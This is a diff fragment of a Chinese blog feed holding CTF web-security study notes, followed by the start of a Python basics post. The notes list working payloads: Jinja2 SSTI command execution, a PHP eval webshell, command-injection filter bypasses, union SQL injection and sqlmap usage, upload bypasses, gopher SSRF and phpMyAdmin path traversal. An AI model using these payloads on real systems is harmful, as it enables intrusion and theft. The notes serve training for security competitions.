+<li><code>arp -a</code> - 显示本地 ARP 缓存表</li>
+<li><code>route print</code> - 显示本地 IP 路由表</li>
+<li><code>nbtstat -A &lt;ip_address&gt;</code> - 获取远程计算机的 NetBIOS 名称表</li>
+<li><code>telnet &lt;hostname_or_ip_address&gt; &lt;port&gt;</code> - 用于远程登录和管理网络设备，需要注意的是 Telnet 传输数据不加密，存在安全隐患</li>
+<li><code>net view</code> - 显示当前域或工作组中的计算机列表</li>
+<li><code>net view \\&lt;computername&gt;</code> - 显示指定计算机上共享的资源列表</li>
+<li><code>net user</code> - 显示用户帐户列表</li>
+<li><code>net user &lt;username&gt;</code> - 显示指定用户帐户的详细信息</li>
+<li><code>net use Z: /delete</code> - 删除指定的网络连接</li>
+<li><code>net user &lt;username&gt;</code> - 显示指定用户的帐户信息</li>
+<li><code>net user &lt;username&gt; *</code> - 更改指定用户的密码</li>
+<li><code>net user &lt;username&gt; /add</code> - 添加新的用户帐户</li>
+<li><code>net user &lt;username&gt; /delete</code> - 删除指定的用户帐户</li>
+<li><code>net localgroup administrators</code> - 显示本地计算机上的管理员组成员</li>
+<li><code>net localgroup administrators &lt;username&gt; /add</code> - 将用户添加到本地计算机的管理员组</li>
+<li><code>net localgroup administrators &lt;username&gt; /delete</code> - 从本地计算机的管理员组中删除用户</li>
+<li><code>net share</code> - 显示当前计算机上的共享资源</li>
+<li><code>net localgroup</code> - 显示本地计算机上的用户组列表</li>
+<li><code>net group</code> - 显示域中的用户组列表</li>
+<li><code>net share</code> - 显示本地计算机上的共享资源列表</li>
+<li><code>net use</code> - 显示计算机上的网络连接</li>
+<li><code>systeminfo</code> - 显示计算机的详细系统信息</li>
+<li><code>whoami /all</code> - 显示当前用户的详细信息，包括用户组和权限</li>
+<li><code>route print</code> - 显示本地 IP 路由表</li>
+<li><code>tracert &lt;hostname_or_ip_address&gt;</code> - 显示到指定目标的 IP 数据包路径</li>
+<li><code>nslookup &lt;hostname_or_ip_address&gt;</code> - 查询 DNS，获取指定主机名或 IP 地址的详细信息</li>
+<li><code>xcopy &lt;source&gt; &lt;destination&gt; /s /e</code> - 复制目录及其子目录，包括空目录</li>
+<li><code>robocopy &lt;source&gt; &lt;destination&gt; /e</code> - 强大的文件复制工具，包括空目录</li>
+<li><code>chkdsk &lt;drive:&gt;</code> - 检查指定磁盘上的磁盘错误</li>
+<li><code>sfc /scannow</code> - 扫描系统文件并修复错误</li>
+<li><code>gpresult /r</code> - 显示用户的组策略设置报告</li>
+<li><code>tasklist</code> - 显示当前运行的进程</li>
+<li><code>taskkill /im &lt;process_name&gt; /f</code> - 强制终止指定的进程</li>
+<li><code>assoc &lt;file_extension&gt;</code> - 显示或修改文件扩展名关联</li>
+<li><code>ftype &lt;file_type&gt;</code> - 显示或修改文件类型</li>
+<li><code>compact &lt;filename&gt;</code> - 显示或修改 NTFS 分区上文件的压缩状态</li>
+<li><code>diskpart</code> - 运行磁盘分区实用程序</li>
+<li><code>tree &lt;directory&gt;</code> - 以树形结构显示目录及其子目录</li>
+<li><code>title &lt;text&gt;</code> - 更改命令提示符窗口的标题</li>
+<li><code>color &lt;color_code&gt;</code> - 更改命令提示符窗口的文本和背景颜色</li>
+<li><code>set</code> - 显示、设置或删除环境变量</li>
+<li><code>path</code> - 显示或设置可执行文件的搜索路径</li>
+<li><code>hostname</code> - 显示计算机的主机名</li>
+<li><code>whoami</code> - 显示当前用户的用户名和域</li>
+<li><code>pause</code> - 暂停批处理文件的处理，等待用户按任意键</li>
+<li><code>timeout /t &lt;seconds&gt;</code> - 在批处理文件中添加延时</li>
+</ul>
+<h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><h3 id="http协议"><a href="#http协议" class="headerlink" title="http协议"></a>http协议</h3><ul>
+<li>GET请求<ul>
+<li>请求行：包括请求方法（GET）、请求资源的路径（&#x2F;index.html）以及HTTP协议版本（HTTP&#x2F;1.1）</li>
+<li>请求头：包含了客户端提供的额外信息，如Host（目标主机名）、User-Agent（浏览器信息）、Accept（可接受的内容类型）等</li>
+<li>请求体：GET请求通常不包含请求体，因为GET请求主要用于获取资源，而不是发送数据</li>
+</ul>
+</li>
+</ul>
+<pre><code class="bash">GET /index.html HTTP/1.1
+Host: www.example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Connection: keep-alive
+</code></pre>
+<ul>
+<li>GET响应<ul>
+<li>状态行：包括HTTP协议版本（HTTP&#x2F;1.1）、状态码（200）和状态描述（OK）</li>
+<li>响应头：包含了服务器提供的额外信息，如Date（响应时间）、Server（服务器软件信息）、Content-Type（资源类型）、Content-Length（资源大小）等</li>
+<li>响应体：包含了请求的资源内容，如HTML文档、图片数据等</li>
+</ul>
+</li>
+</ul>
+<pre><code class="bash">HTTP/1.1 200 OK
+Date: Fri, 21 Apr 2023 08:23:19 GMT
+Server: Apache
+Content-Type: text/html; charset=UTF-8
+Content-Length: 12345
+Connection: keep-alive
+Last-Modified: Mon, 10 Apr 2023 14:00:00 GMT
+ETag: &quot;1a2b3c4d&quot;
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+  &lt;title&gt;Example Page&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;h1&gt;Hello, World!&lt;/h1&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<h3 id="vim-交换文件名"><a href="#vim-交换文件名" class="headerlink" title="vim 交换文件名"></a>vim 交换文件名</h3><p>在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容</p>
+<blockquote>
+<p>以 index.php 为例：第一次产生的交换文件名为 .index.php.swp<br>再次意外退出后，将会产生名为 .index.php.swo 的交换文件<br>第三次产生的交换文件则为 .index.php.swn</p>
+</blockquote>
+<h3 id="扫描目录"><a href="#扫描目录" class="headerlink" title="扫描目录"></a>扫描目录</h3><pre><code class="bash">cd dirsearch
+python dirsearch.py -u 网址 -e php 或 python .\dirsearch.py -u 网址 -e php
+</code></pre>
+<h3 id="DS-Store文件泄露"><a href="#DS-Store文件泄露" class="headerlink" title=".DS_Store文件泄露"></a>.DS_Store文件泄露</h3><pre><code class="bash">.DS_Store(Desktop Services Store)是macOS目录下的隐藏文件, 包含了当前目录结构和一些的自定义信息, 如背景和图标位置等, 在windows下类似的文件为desktop.ini. 暴露了.DS_Store文件也就相当于暴露了该目录下的所有内容. 可以说是比较严重的泄露.
+</code></pre>
+<h3 id="Git泄漏"><a href="#Git泄漏" class="headerlink" title="Git泄漏"></a>Git泄漏</h3><pre><code class="bash">githacker --url http(s)://xxxxxx --output-folder ~/target
+cd target
+git log
+git diff xxxx
+git stash list 
+git stash pop
+git reflog 历史
+//
+wget -r url/.git
+</code></pre>
+<h3 id="图片隐写"><a href="#图片隐写" class="headerlink" title="图片隐写"></a>图片隐写</h3><ul>
+<li>扫描 <code>binwalk 图片路径</code></li>
+<li>分离<ul>
+<li><code>dd if=图片路径 of output.zip skip=xx(按扫描出来的大小填写) bs=1</code></li>
+<li><code>foremost -v -i 图片路径 -o /Users/dionysus/Desktop/recovered_data</code></li>
+</ul>
+</li>
+<li>解压<ul>
+<li><code>unzip -l output.zip</code></li>
+<li><code>unzip output.zip</code></li>
+</ul>
+</li>
+<li>获取密码<ul>
+<li>暴力破解<code>fcrackzip -b -c &#39;aA1&#39; -l 1-10 -u /Users/dionysus/output.zip</code></li>
+<li>分析进制数据 （  010editor  ）</li>
+<li>图片移入<ul>
+<li>查看数据</li>
+<li>修改宽高<ul>
+<li>待</li>
+<li>补</li>
+<li>充</li>
+</ul>
+</li>
+<li>more···</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<pre><code class="bash">附录
+PNG (png)，文件头(hex)：89504E47
+PNGImageFile (png), 文件头(hex)：89504E470D0A
+JPEG (jpg)， 文件头(hex)：FFD8FF
+GIF (gif)，文件头(hex)：47494638
+TIFF (tif)，文件头(hex)：49492A00
+GzipArchiveFile (gz;tar;tgz), 文件头(hex)：1F8B
+AdobeAcrobat (pdf), 文件头(hex)：255044462D312E
+EXE（EXE）， 文件头(hex)：4D5A90
+Windows Bitmap (bmp)，文件头(hex)：424D
+CAD (dwg)，文件头(hex)：41433130
+Adobe Photoshop (psd)，文件头(hex)：38425053
+Rich Text Format (rtf)，文件头(hex)：7B5C727466
+XML (xml)，文件头(hex)：3C3F786D6C
+HTML (html)，文件头(hex)：68746D6C3E
+Email [thorough only] (eml)，文件头(hex)：44656C69766572792D646174653A
+Outlook Express (dbx)，文件头(hex)：CFAD12FEC5FD746F
+Outlook (pst)，文件头(hex)：2142444E
+MS Word/Excel (xls.or.doc)，文件头(hex)：D0CF11E0
+MS Access (mdb)，文件头(hex)：5374616E64617264204A
+WordPerfect (wpd)，文件头(hex)：FF575043
+Postscript (eps.or.ps)，文件头(hex)：252150532D41646F6265
+Adobe Acrobat (pdf)，文件头(hex)：255044462D312E
+Quicken (qdf)，文件头(hex)：AC9EBD8F
+Windows Password (pwl)，文件头(hex)：E3828596
+ZIP Archive (zip)，文件头(hex)：504B0304
+RAR Archive (rar)，文件头(hex)：52617221
+Wave (wav)，文件头(hex)：57415645
+AVI (avi)，文件头(hex)：41564920
+Real Audio (ram)，文件头(hex)：2E7261FD
+Real Media (rm)，文件头(hex)：2E524D46
+MPEG (mpg)，文件头(hex)：000001BA
+MPEG (mpg)，文件头(hex)：000001B3
+Quicktime (mov)，文件头(hex)：6D6F6F76
+Windows Media (asf)，文件头(hex)：3026B2758E66CF11
+MIDI (mid)，文件头(hex)：4D546864
+</code></pre>
+<h3 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h3><p><code>&#123;&#123;config.items()&#125;&#125;</code>- Jinja2引擎解析这个字符串时，它会返回一个包含所有配置项的列表<br><code>&#123;&#123; config.__class__.__init__.__globals__['os'].popen('ls ../').read() &#125;&#125;</code>读取系统文件<br><code>import os os.system(&#39;ls ../&#39;) os.system(&#39;cat ../flag&#39;)</code></p>
+<pre><code class="bash">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;
+&#123;% if c.__name__ == 'catch_warnings' %&#125;
+  &#123;% for b in c.__init__.__globals__.values() %&#125;
+  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;
+    &#123;% if 'eval' in b.keys() %&#125;
+      &#123;&#123; b['eval']('__import__("os").popen("env").read()') &#125;&#125;
+    &#123;% endif %&#125;
+  &#123;% endif %&#125;
+  &#123;% endfor %&#125;
+&#123;% endif %&#125;
+&#123;% endfor %&#125;
+</code></pre>
+<p><code>tplmap</code></p>
+<pre><code class="bash">-d DATA：这个参数允许你设置HTTP请求的body内容。
+-H HEADER：这个参数允许你设置HTTP请求的header。
+-X METHOD：这个参数允许你设置HTTP请求的方法，如GET、POST等。
+--os-shell：这个参数会尝试获取一个操作系统shell。
+--os-cmd：这个参数允许你执行一个操作系统命令。
+</code></pre>
+<h3 id="svn泄漏"><a href="#svn泄漏" class="headerlink" title="svn泄漏"></a>svn泄漏</h3><pre><code class="bash">工具：dvcs-ripper tree
+cd dvcs-ripper
+perl ./rip-svn.pl -v -u url/.svn/
+#ls -la -&gt; ls -la.svn
+tree -a .svn #-a代表显示隐藏文件
+cat ...#根据具体文件查看信息
+</code></pre>
+<h3 id="hg泄漏"><a href="#hg泄漏" class="headerlink" title="hg泄漏"></a>hg泄漏</h3><pre><code class="bash">perl ./rip-hg.pl -v -u http://challenge-02ead012a55810f3.sandbox.ctfhub.com:10800/.hg
+</code></pre>
+<h3 id="查询具体所含数据"><a href="#查询具体所含数据" class="headerlink" title="查询具体所含数据"></a>查询具体所含数据</h3><p><code>grep -ir flag</code>这是一个使用 grep 命令在文件中搜索特定字符串（本例中为 “flag”）的命令行指令。-i 选项表示大小写不敏感，-r 选项表示递归搜索文件夹</p>
+<pre><code class="bash">-i：忽略大小写
+-n：显示匹配行的行号
+-r：递归搜索文件夹中的文件
+-w：查找整个单词匹配
+-l：仅列出包含匹配项的文件名
+-c：计算匹配行的数量
+</code></pre>
+<h2 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h2><p>-弱</p>
+<p>-常用</p>
+<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="eval执行"><a href="#eval执行" class="headerlink" title="eval执行"></a>eval执行</h3><pre><code class="bash">！！！！！！结尾要带分号！！！！！！
+&lt;?php
+if (isset($_REQUEST[&#39;cmd&#39;])) &#123;
+    eval($_REQUEST[&quot;cmd&quot;]);
+&#125; else &#123;
+    highlight_file(__FILE__);
+&#125;
+?&gt;
+
+
+system(&quot;ls /&quot;);
+system(&quot;cat /flag&quot;);
+phpinfo();
+</code></pre>
+<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><pre><code class="bash">#函数查找字符串在另一字符串中第一次出现的位置（区分大小写） 
+#strpos(&quot;You love php, I love php too!&quot;,&quot;php&quot;);
+...url/?file=shell.txt
+构造post：ctfhub=system(&quot;cat /flag&quot;);
+</code></pre>
+<ul>
+<li>php:&#x2F;&#x2F;input#从输入中读取</li>
+</ul>
+<p>eg: <code>&lt;?php system(&quot;ls&quot;);?&gt;</code></p>
+<ul>
+<li>php:&#x2F;&#x2F;filter</li>
+</ul>
+<p><code>php://filter/read=filter_name/resource=resource_url</code><br>filter_name：要应用的过滤器名称<br>resource_url：要读取的资源的URL<br>eg:<code>file=php://filter/read=convert.base64-encode/resource=/flag</code></p>
+<ul>
+<li>data:&#x2F;&#x2F;text&#x2F;plain;base64,<br>file_get_contents()的$filename参数不仅仅为本地文件路径，还可以是一个网络路径URL<br>eg:<code>text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</code></li>
+</ul>
+<pre><code class="bash">file | base64也可以写成base64 file
+127.0.0.1&amp; cat 1382668722644.php | base64
+代替cat
+cat 由第一行开始显示内容，并将所有内容输出
+tac 从最后一行倒序显示内容，并将所有内容输出
+more 根据窗口大小，一页一页的现实文件内容
+less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符
+head 只显示头几行
+tail 只显示最后几行
+nl 类似于cat -n，显示时输出行号
+tailf 类似于tail -f
+在 bash 下, 可以用以下字符代替空格:&lt;,&lt;&gt;,%20(space),%09(tab),$IFS$9, $&#123;IFS&#125;,$IFS
+</code></pre>
+<ul>
+<li><p>%0a：表示换行符（newline），用于在字符串或文本中表示一个新行的开始。在ASCII编码中，它对应于十进制值10。</p>
+</li>
+<li><p>%0d：表示回车符（carriage return），用于将光标移动到当前行的开始。在ASCII编码中，它对应于十进制值13。在某些环境中，回车符和换行符一起用于表示新行（例如，Windows中的\r\n）。</p>
+</li>
+<li><p>;：分号在许多编程语言中用于分隔语句。在命令行环境中，如Unix和Linux Shell，分号用于在同一行上执行多个命令，命令会按顺序执行，不考虑前一个命令的执行结果。</p>
+</li>
+<li><p>&amp;：在命令行环境中，&amp;符号通常用于将命令放入后台运行，允许用户在命令执行时继续使用命令行。在某些编程语言中，&amp;还可以表示按位与（bitwise AND）操作。</p>
+</li>
+<li><p>|：管道符，用于在命令行环境中将一个命令的输出作为另一个命令的输入。这使得用户可以将多个操作链接在一起，从而创建复杂的数据处理管道。</p>
+</li>
+<li><p>&amp;&amp;：在命令行环境中，&amp;&amp;用于将多个命令链接在一起，使得只有在前一个命令成功执行（返回值为0）时，才会执行下一个命令。在某些编程语言中，&amp;&amp;表示逻辑与（logical AND）操作。</p>
+</li>
+<li><p>||：在命令行环境中，||用于将多个命令链接在一起，使得只有在前一个命令失败执行（返回值非0）时，才会执行下一个命令。在某些编程语言中，||表示逻辑或（logical OR）操作。</p>
+</li>
+<li><p><code>ping 127.0.0.1 &amp; ls</code>：<code>&amp;</code>符号将 <code>ping 127.0.0.1</code> 命令放入后台运行，而不会阻塞命令行界面。在 <code>ping</code> 命令开始执行后，<code>ls</code> 命令会立即执行。这里，<code>ping</code> 和 <code>ls</code> 命令几乎同时运行，它们之间没有依赖关系。</p>
+</li>
+<li><p><code>ping 127.0.0.1 &amp;&amp; ls</code>：<code>&amp;&amp;</code> 符号表示只有在前一个命令成功执行（返回值为0）时，才会执行下一个命令。在这个例子中，<code>ls</code> 命令只有在 <code>ping 127.0.0.1</code> 命令成功执行后才会执行。然而，<code>ping</code> 命令在默认情况下会持续执行，你需要手动停止它（例如，按 <code>Ctrl+C</code>）才能让 <code>ls</code> 命令执行。</p>
+</li>
+<li><p><code>ping 127.0.0.1 | ls</code>：<code>|</code> 符号是管道符，表示将前一个命令的输出作为后一个命令的输入。然而，在这个例子中，这种用法是不正确的，因为 <code>ls</code> 命令本身不接受来自其他命令的输入。因此，这个命令可能会导致错误或不可预期的行为。</p>
+</li>
+<li><p><code>ping 127.0.0.1 ; ls</code>： <code>;</code> 符号表示在同一行上执行多个命令。命令会按顺序执行，不考虑前一个命令的执行结果。在这个例子中，<code>ping 127.0.0.1</code> 命令会首先执行，然后在其完成后（需要手动停止，例如按 Ctrl+C），<code>ls</code> 命令会立即执行。</p>
+</li>
+</ul>
+<p>过滤小结:</p>
+<ul>
+<li>过滤cat:</li>
+</ul>
+<pre><code class="bash">  ca/t ca&quot;&quot;t ca&#39;&#39;t
+  拼接 a=ca;b=t;$a$b
+</code></pre>
+<ul>
+<li>过滤空格: <code>&lt;,&lt;&gt;,$&#123;IFS&#125;</code></li>
+<li>过滤运算分隔符号:<code>;-&gt;%0a</code> <code>file | base64-&gt; base64 file</code> <code>/-&gt;cd$&#123;IFS&#125;</code></li>
+</ul>
+<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>正道在此：！</p>
+<pre><code class="bash">1.查当前数据库名称
+
+ &#39; or 1=1 union select 1,database(),3 limit 1,2;#-- 
+
+得到数据库名称web2
+2.查看数据库表的数量
+
+&#39; or 1=1 union select 1,(select count(*) from information_schema.tables where table_schema = &#39;web2&#39;),3 limit 1,2;#-- 
+
+得到数据库表数量为2
+3.查表的名字
+
+第一个表:
+
+&#39; or 1=1 union select 1,(select table_name from information_schema.tables where table_schema = &#39;web2&#39; limit 0,1),3 limit 1,2;#-- 
+
+得到表名：flag 第二个表:
+
+&#39; or 1=1 union select 1,(select table_name from information_schema.tables where table_schema = &#39;web2&#39; limit 1,2),3 limit 1,2;#-- 
+
+得到表名：user
+4.查flag表列的数量
+
+&#39; or 1=1 union select 1,(select count(*) from information_schema.columns where table_name = &#39;flag&#39; limit 0,1),3 limit 1,2;#-- 
+
+只有1列
+5.查flag表列的名字
+
+&#39; or 1=1 union select 1,(select column_name from information_schema.columns where table_name = &#39;flag&#39; limit 0,1),3 limit 1,2;#-- 
+
+列名为flag
+6.查flag表记录的数量
+
+&#39; or 1=1 union select 1,(select count(*) from flag),3 limit 1,2;#-- 
+
+只有一条记录
+7.查flag表记录值
+
+&#39; or 1=1 union select 1,(select flag from flag limit 0,1),3 limit 1,2;#-- 
+
+得到flag
+</code></pre>
+<pre><code class="bash">#POST 需要 --data &#39;a=1&amp;b=2&#39; --dbs
+1.sqlmap -u &quot;目标网址/?id=1&quot; --dbs
+2.sqlmap -u &quot;目标网址&quot; -D [数据库名] --tables
+3.sqlmap -u &quot;目标网址&quot; -D [数据库名] -T [表名] --columns
+4.sqlmap -u &quot;目标网址&quot; -D [数据库名] -T [表名] -C [列名] --dump
+#
+报错注入: sqlmap -u [目标url] --current-db --batch --threads 10 --technique E 
+布尔盲注: sqlmap -u [目标url] --current-db --batch --threads 10 --technique B
+时间盲注: sqlmap -u [目标url] --current-db --batch --threads 10 --technique T -v 3
+
+！POST注入（*标识哪里 就对哪里进行打击）
+sqlmap -u &quot;目标url&quot; --data &quot;uname=admin*&amp;passwd=admin&amp;submit=Submit&quot; --dbs --batch --threads 10 --technique E
+
+SQLmap实现Http-header头注入之 
+1.User-Agent注入 ：
+#在使用请求头注入的时候，--level必须大于3
+
+sqlmap -u [目标url] --user-agent=&quot;抓包得到的对应的内容*&quot; --level 4 --dbs --threads 10 --batch --technique E
+
+2.Cookie注入 ：
+// sqlmap -u [目标url] --cookie=&quot;原来*的cookie内容&quot; --level 4 --dbs --threads 10 --batch --technique E
+
+
+
+#一些补充
+--technique B 布尔盲注 
+--technique E 报错注入
+--technique U union查询注入
+--technique S 堆叠注入
+--technique T 时间盲注
+--technique Q 内联查询注入
+
+脚本绕过限制 
+eg：sqlmap -u &quot;目标网址&quot; -D [数据库名] -T [表名] -C [列名] --dump --tamper &quot;space2comment.py&quot;
+
+space2comment.py    -- 作用是用注释/**/替换空格字符&#39; &#39;
+equaltolike.py      -- 作用是用like代替等号
+apostrophemask.py   -- 作用是用utf8代替引号
+greatest.py         -- 作用是绕过过滤&#39;&gt;&#39; ,用GREATEST替换大于号
+</code></pre>
+<p>为什么<code>username=xxx&#39;or&#39;1=1&amp;password=xxx&#39;or&#39;1=1</code>可以达到SQL注入，从而直接输出表内容的目的。</p>
+<p>假设我们的表名叫<code>t_user</code>，<code>username</code>为用户名字段，<code>password</code>为密码字段，只有当用户名和密码字段都正确的时候才能输出该数据的内容</p>
+<p><code>SELECT * FROM t_user WHERE username = &#39;xxx&#39; AND password = &quot;xxxx&quot;</code><br>但是我们通过在xxx后面拼接一个’号来闭合<code>username</code>的值，然后通过<code>or 1 = 1</code>使where的条件恒等于true，上面的SQL也就变成了</p>
+<p><code>SELECT * FROM t_user WHERE username=&#39;xxx&#39;or 1 = 1 AND password=&#39;xxx&#39;or 1 = 1</code><br>从而可以查出所有的数据。</p>
+<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><blockquote>
+<p>工具：蚁剑</p>
+</blockquote>
+<ul>
+<li>一句话木马 <code>&lt;?php eval(@$_POST[&#39;a&#39;]); ?&gt;</code></li>
+</ul>
+<p>上传文件绕过限制：</p>
+<blockquote>
+<ul>
+<li>前端验证: 关闭前端js 或许改后缀名bp重发</li>
+<li>.htaccess: 传入.htaccess文件内容为<code>AddType application/x-httpd-php x</code>or<code>SetHandler application/x-httpd-php</code></li>
+</ul>
+<p>#x为格式 如.jpg .png 作用是用php格式打开这些文件，然后把一句话木马以对应后缀上传即可。(后者为把所有文件当成php处理)</p>
+<ul>
+<li>00截断:用户输入的url参数包含%00经过浏览器自动转码后截断后面字符.</li>
+</ul>
+<p>#需要注意的是 将<code>POST /?road=/var/www/html/upload/ HTTP/1.1</code>改为<code>POST /?road=/var/www/html/upload/shell.php%00 HTTP/1.1</code>。而不是更改 <code>filename=&quot;shell.png&quot;</code>为<code>filename=&quot;shell.php%00png</code></p>
+<ul>
+<li>文件头检测:对于某些限制png jpg等格式上传的，会对其文件头进行检测。如png 只需在一句话木马二进制文件前加上<code>89504E47</code> 再用bp重发，蚁剑连接。</li>
+<li>双写后缀:可能在出现<code>php php5 ajax</code>等后缀置为空白，构造<code>pphphp</code>后缀，则会置为php后缀</li>
+<li>MIME绕过:如下所示</li>
+</ul>
+</blockquote>
+<pre><code class="bash">1.先对于服务器上传不同的文件，直至上传成功，然后利用BS进行抓包。查看报文的最后一段有Content-type字段部分
+2.上传木马，修改Content-type
+3.使用antSword进行连接
+</code></pre>
+<p>蚁剑，一句话木马，bp重发请求文件上传，配置文件绕过限制<br>数据库漏洞</p>
+<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h3 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h3><blockquote>
+<p>已单独开了一篇文章 指路 <a href="https://">here</a></p>
+</blockquote>
+<pre><code class="bash">file:///
+#file:///var/www/html/flag.php
+dict://
+#探测内网端口协议
+sftp://
+ldap://
+tftp://
+gopher://(万金油)
+</code></pre>
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>bp 攻击<br><code>url=dict://127.0.0.1:8000</code><br><code>$8000$负载number8000-9000 step:1</code></p>
+<p>扫描找到数据字节不同的端口重发<br><code>http://127.0.0.1:xxxx</code></p>
+<h3 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h3><h4 id="gopher协议"><a href="#gopher协议" class="headerlink" title="gopher协议"></a>gopher协议</h4><p>最终gopher协议伪造的http请求<br><code>POST%252520%25252Fflag.php%252520HTTP%25252F1.1%25250D%25250Ahost%25253A%252520127.0.0.1%25253A80%25250D%25250AContent-Type%25253A%252520application%25252Fx-www-form-urlencoded%25250D%25250AContent-Length%25253A%25252036%25250D%25250A%25250D%25250Akey%25253D5b69b89c146e1ed3b90708ffa267f06a</code><br>三次URL解码得到的玩意:</p>
+<pre><code class="bash">POST /flag.php HTTP/1.1
+host: 127.0.0.1:80
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 36
+key=5b69b89c146e1ed3b90708ffa267f06a
+</code></pre>
+<p>(但是我真的没看懂，日后再说)<br>大佬牛b！！！</p>
+<pre><code class="python">import urllib.parse
+
+payload =\
+&quot;&quot;&quot;
+yourpayload
+&quot;&quot;&quot;  # 注意后面一定要有回车，回车结尾表示http请求结束
+
+tmp = urllib.parse.quote(payload)
+new = tmp.replace(&#39;%0A&#39;, &#39;%0D%0A&#39;)
+new = urllib.parse.quote(new)
+result = &#39;gopher://127.0.0.1:80/&#39; + &#39;_&#39; + new
+result = urllib.parse.quote(result)
+print(result)
+</code></pre>
+<p><code>GET /?url=http://127.0.0.1:80/index.php?url=result   HTTP/1.1</code>重发即可</p>
+<h2 id="一些漏洞"><a href="#一些漏洞" class="headerlink" title="一些漏洞"></a>一些漏洞</h2><p>对于某些漏洞，查询版本即可<br>如phpmyadmin 4.80&#x2F;4.81</p>
+<ul>
+<li><code>?target=db_datadict.php%253f../../../../../../etc/passwd</code></li>
+<li><code>?target=db_datadict.php%253f../../../../../../flag</code><br>即可获取flag</li>
+</ul>
+<p>qs:<br>qs是负责url参数转换js库。</p>
+<p>简单用法：foo[bar]&#x3D;baz–&gt;</p>
+<pre><code class="bash">assert.deepEqual(qs.parse(&#39;foo[bar]=baz&#39;),&#123;
+    foo:&#123;
+      bar:&#39;baz&#39;
+    &#125;
+&#125;);
+#可嵌套对象
+#   foo:&#123;
+#     bar:&#123;
+#         baz：&#39;foobarbaz&#39;
+#     &#125;
+#   &#125;
+</code></pre>
+<p>url:a&#x3D;b&amp;proxy&#x3D;nginx–&gt;<br><code>&#123;a:&#39;b&#39;,proxy:&#39;nginx&#39;&#125;</code><br>qs最多解析1000个参数<br>所以<br>answer: <code>url/?a=1&amp;a=1.............</code></p>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>python</title>
+    <url>/2023/04/21/python/</url>
+    <content><![CDATA[<h3 id="变量赋值"><a href="#变量赋值" class="headerlink" title="变量赋值"></a>变量赋值</h3><h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><pre><code class="bash">  astr=&quot;python&quot;      //[起始：结束（不包含）：步长]
+  print(astr[0:2])   //py 
+  print(astr[-1])
+  print(astr[::-1])
+</code></pre>
+<h4 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h4><pre><code class="bash">  alist=[&quot;tom&quot;,&quot;jerry&quot;] //可以写入不同类型的数据
+  alist[0]
+  if name in alist :
+      print(&quot;Yes&quot;);
+</code></pre>
+<h4 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h4><pre><code class="bash">  atuple=(&quot;tom&quot;,&quot;jerry&quot;) 
+</code></pre>
+<h4 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h4><pre><code class="bash">  userdict=&#123;&quot;tom&quot;:&quot;123&quot;,&quot;jerry&quot;:&quot;456&quot;&#125;//字典没有索引值 键值对来取值
+  if name in userdict and password==userdict[username]:
+      print(&quot;Yes&quot;)
+</code></pre>
+<h3 id="文件读取写入"><a href="#文件读取写入" class="headerlink" title="文件读取写入"></a>文件读取写入</h3><blockquote>
+<p>f&#x3D;open(“路径”,”#”)    &#x2F;&#x2F;#&#x3D;rb···</p>
+</blockquote>
+<ul>
+<li><code>close()</code> - 关闭文件，释放相关的系统资源</li>
+<li><code>read(size=-1)</code> - 从文件中读取指定字节数的数据，如果未指定 size 或 size 为负数，则读取整个文件</li>
+<li><code>readline(size=-1)</code> - 从文件中读取一行数据，可以指定最大读取字节数</li>
+<li><code>readlines(hint=-1)</code> - 从文件中读取所有行，并返回一个包含所有行的列表，可以指定最大读取字节数</li>
+<li><code>write(text)</code> - 将指定的文本写入文件</li>
+<li><code>writelines(lines)</code> - 向文件中写入一个字符串列表，不添加行分隔符</li>
+<li><code>seek(offset[, whence])</code> - 改变文件指针的位置，offset 表示相对于 whence 的偏移量，whence 可选值：0（文件开头，默认），1（当前位置），2（文件末尾）</li>
+<li><code>tell()</code> - 返回文件指针的当前位置，相对于文件开头</li>
+<li><code>flush()</code> - 将文件缓冲区的内容写入文件，并清空缓冲区</li>
+<li><code>fileno()</code> - 返回文件的文件描述符（整数）</li>
+<li><code>isatty()</code> - 检查文件是否为终端设备（例如控制台、终端窗口等）</li>
+<li><code>truncate(size=None)</code> - 裁剪文件到指定大小，如果未指定 size，则裁剪到当前文件指针位置</li>
+</ul>
+<h3 id="模块和函数"><a href="#模块和函数" class="headerlink" title="模块和函数"></a>模块和函数</h3><pre><code class="python">    &quot;&quot;&quot;
+    模块作用
+    包含功能
+    other
+    &quot;&quot;&quot;
+    # 变量类型 作用
+    def name():
